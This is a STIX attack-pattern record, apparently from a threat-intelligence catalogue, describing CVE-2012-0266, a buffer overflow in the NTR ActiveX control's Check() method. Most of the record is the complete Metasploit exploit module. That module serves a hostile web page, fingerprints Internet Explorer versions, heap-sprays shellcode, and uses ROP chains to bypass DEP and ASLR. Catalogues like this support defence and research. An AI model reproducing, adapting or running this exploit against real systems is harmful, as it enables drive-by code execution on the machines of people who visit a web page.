{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68295651-95f2-4c7b-8a1f-b02c533b9791",
    "created": "2024-08-14T16:44:23.634416Z",
    "modified": "2024-08-14T16:44:23.63442Z",
    "name": "NTR ActiveX Control Check() Method Buffer Overflow",
    "description": " This module exploits a vulnerability found in NTR ActiveX 1.1.8. The vulnerability exists in the Check() method, due to the insecure usage of strcat to",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ntr_activex_check_bof.rb",
            "external_id": "ntr_activex_check_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0266"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120514113631/http://secunia.com/secunia_research/2012-1/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{E6ACF817-0A85-4EBE-9F0A-096C6488CFEA}\",\n  #  :method     => \"Check\",\n  #  :rank       => NormalRanking\n  #})\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NTR ActiveX Control Check() Method Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability found in NTR ActiveX 1.1.8. The\n        vulnerability exists in the Check() method, due to the insecure usage of strcat to\n        build a URL using the bstrParams parameter contents (note: this is also the reason\n        why the module won't allow you to modify the URIPATH), which leads to code execution\n        under the context of the user visiting a malicious web page. In order to bypass\n        DEP and ASLR on Windows Vista and Windows 7 JRE 6 is needed.\n      },\n      'Author'         =>\n        [\n          'Carsten Eiram', # Vuln discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-0266' ],\n          [ 'OSVDB', '78252' ],\n          [ 'BID', '51374' ],\n          [ 'URL', 'http://web.archive.org/web/20120514113631/http://secunia.com/secunia_research/2012-1/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space' => 956,\n          'DisableNops' => true,\n          'BadChars'    => \"\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # NTR ActiveX 1.1.8.0\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',\n            {\n              'Rop' => nil,\n              'Offset' => '0x5f4',\n              'Random' => false,\n              'Ret' => 0x0c0c0c0c\n            }\n          ],\n          [ 'IE 7 on Windows XP SP3',\n            {\n              'Rop' => nil,\n              'Offset' => '0x5f4',\n              'Random' => false,\n              'Ret' => 0x0c0c0c0c\n            }\n          ],\n          [ 'IE 8 on Windows XP SP3',\n            {\n              'Rop' => :msvcrt,\n              'Offset' => '0x5f4',\n              'Random' => false,\n              'Ret' => 0x77c15ed5 # xchg eax, esp # ret # from msvcrt\n            }\n          ],\n          [ 'IE 7 on Windows Vista',\n            {\n              'Rop' => nil,\n              'Offset' => '0x5f4',\n              'Random' => false,\n              'Ret' => 0x0c0c0c0c\n            }\n          ],\n          [ 'IE 8 on Windows Vista',\n            {\n              'Rop' => :jre,\n              'Offset' => '0x5f4',\n              'Random' => false,\n              'Ret' => 0x7c348b05 # xchg eax, esp # ret # from msvcrt71 from Java 6\n            }\n          ],\n          [ 'IE 8 on Windows 7',\n            {\n              'Rop' => :jre,\n              'Offset' => '0x5f4',\n              'Random' => false,\n              'Ret' => 0x7c348b05 # xchg eax, esp # ret # from msvcrt71 from Java 6\n            }\n          ],\n          [ 'IE 9 on Windows 7',\n            {\n              'Rop' => :jre,\n              'Offset' => '0x5fe',\n              'Random' => true,\n              'Ret' => 0x7c348b05 # xchg eax, esp # ret # from msvcrt71 from Java 6\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n\n    deregister_options('URIPATH')\n\n  end\n\n  #\n  # Returns a random URI path which allows to reach the vulnerable code\n  #\n  def resource_uri\n    path = random_uri\n    path << random_uri\n    return path\n  end\n\n\n  #\n  # Generates a random URI for use with making finger printing more\n  # challenging.\n  #\n  def random_uri\n    \"/\" + Rex::Text.rand_text_alphanumeric(rand(10) + 6)\n  end\n\n  # Spray published by corelanc0d3r\n  # Exploit writing tutorial part 11 : Heap Spraying Demystified\n  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/\n  def get_random_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n\n    function randomblock(blocksize)\n    {\n      var theblock = \"\";\n      for (var i = 0; i < blocksize; i++)\n      {\n        theblock += Math.floor(Math.random()*90)+10;\n      }\n      return theblock;\n    }\n\n    function tounescape(block)\n    {\n      var blocklen = block.length;\n      var unescapestr = \"\";\n      for (var i = 0; i < blocklen-1; i=i+4)\n      {\n        unescapestr += \"%u\" + block.substring(i,i+4);\n      }\n      return unescapestr;\n    }\n\n    var heap_obj = new heapLib.ie(0x10000);\n\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset_length = #{t['Offset']};\n\n    for (var i=0; i < 0x1000; i++) {\n      var padding = unescape(tounescape(randomblock(0x1000)));\n      while (padding.length < 0x1000) padding+= padding;\n      var junk_offset = padding.substring(0, offset_length);\n      var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n      heap_obj.alloc(sprayblock);\n    }\n\n    JS\n\n    return spray\n  end\n\n  def get_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < 449; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1] #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2] #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3] #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[4] #IE 7 on Windows Vista SP2\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 8/\n      return targets[5] #IE 7 on Windows Vista SP2\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8/\n      return targets[6] #IE 7 on Windows 7 SP1\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 9/\n      return targets[7] #IE 7 on Windows 7 SP1\n    else\n      return nil\n    end\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n      when :msvcrt\n        print_status(\"Using msvcrt ROP\")\n        rop_payload = generate_rop_payload('msvcrt', code, {'target'=>'xp'})\n\n      else\n        print_status(\"Using JRE ROP\")\n        rop_payload = generate_rop_payload('java', code)\n    end\n\n    return rop_payload\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    print_status(\"User-agent: #{agent}\")\n\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have a setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    p = get_payload(my_target, cli)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n\n    if my_target['Random']\n      js = get_random_spray(my_target, js_code, js_random_nops)\n    else\n      js = get_spray(my_target, js_code, js_nops)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    # The overflow occurs after strcat'ing controlled data to\n    # a url with the next format:\n    # http://192.168.1.128:8080/asdf/mod/mod.asp?a=0&d=[USER DATA]\n    #\n    # The URI length can be calculated on the fly since the value\n    # for the \"a\" param is being always 0 on my tests, even when\n    # should be the result of GetTickCount\n    my_uri = get_uri(cli)\n    pos = my_uri.rindex(\"/\")\n    my_uri = my_uri[0, pos]\n    my_uri << \"/mod/mod.asp?a=0&d=\"\n\n    my_badchars = \"\\x00\\x0a\\x0d\\x22\\x2c\"\n\n    if my_target['Rop'].nil?\n      bof = rand_text_alpha(1056 - my_uri.length, my_badchars)\n      bof << [my_target.ret].pack(\"V\")\n    else\n      bof = rand_text_alpha(1024 - my_uri.length, my_badchars)\n      bof << [0x0c0c0c0c].pack(\"V\") # will become ESP after stackpivot\n      bof << rand_text_alpha(1056 - my_uri.length - bof.length, my_badchars)\n      bof << [my_target.ret].pack(\"V\") # stackpivot\n    end\n\n    sploit = \"#{bof},#{rand_text_alpha(4)},#{rand_text_alpha(4)}\"\n\n    html = <<-MYHTML\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:E6ACF817-0A85-4EBE-9F0A-096C6488CFEA' id='test'></object>\n    <script>\n    test.Check(\"#{sploit}\");\n    </script>\n    </body>\n    </html>\n    MYHTML\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-01-11",
    "x_mitre_platforms": [
        "win'"
    ]
}